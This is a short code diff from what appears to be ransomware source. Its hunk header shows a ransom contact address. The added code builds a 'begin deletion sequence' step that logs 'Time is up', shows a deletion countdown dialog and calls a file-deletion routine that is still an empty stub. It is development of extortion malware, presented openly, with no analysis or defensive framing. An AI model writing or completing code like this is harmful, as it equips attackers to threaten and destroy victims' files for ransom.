@@ -1077,11 +1077,13 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
 
     # Step 54: Function to begin the deletion sequence
     def begin_deletion_sequence(self):
+        if not self.stopDeletion:
+            self.log("Time is up. Starting file deletion sequence.", "red")
+            self.deletion_dialog = DeletionCountdownDialog(self, self. stop_deletion_process)
+            self.deletion_process()
+
+    def deletion_process(self):
         pass
-
-
-
-
 
 
 if __name__ == "__main__":
